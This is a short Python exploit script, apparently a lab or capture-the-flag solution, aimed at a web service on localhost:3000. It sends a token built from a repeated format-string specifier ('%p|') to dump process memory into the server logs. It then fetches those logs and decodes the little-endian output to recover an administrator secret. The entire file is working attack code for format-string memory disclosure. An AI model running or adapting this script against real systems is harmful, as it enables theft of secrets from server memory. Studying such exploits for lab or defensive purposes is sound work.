#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"
SEARCH_PATTERN = b"Secret: supersecret"

# This request makes sure that the query to retrieve the secret is
# executed and the secret is stored in memory.
print(requests.post(URL, json={"token": "0123456789"}).text)

# Dumps a lot of memory
# Might also dump less by using format string indexes
print(requests.post(URL, json={"token": "%p|" * (1024 * 160)}).text)

# Retrieves the log containing the dump
dump = requests.get(URL + "/get-logs", params={"token": "0123456789"}).text

# the data is dumped from memory as little-endian
memory_dump = SEARCH_PATTERN[::-1][:4].hex()
if memory_dump in dump:
    print(f"[+] Found {SEARCH_PATTERN} in logs, indicating a successful read.")
    # Decoding the memory dump (might take a bit)
    total = ""
    for el in dump.split("|"):
        try:
            if not el.startswith("0x"):
                continue
            total += bytes.fromhex(el[2:]).decode("utf-8", errors="ignore")[::-1]
        except Exception as e:
            continue
    # Prints a fragment of the dump which should contain "Secret: <adminsecret>"
    ind = total.find(SEARCH_PATTERN.decode("utf-8"))
    print("Possible good dump:", total[ind : ind + len(SEARCH_PATTERN) + 50])
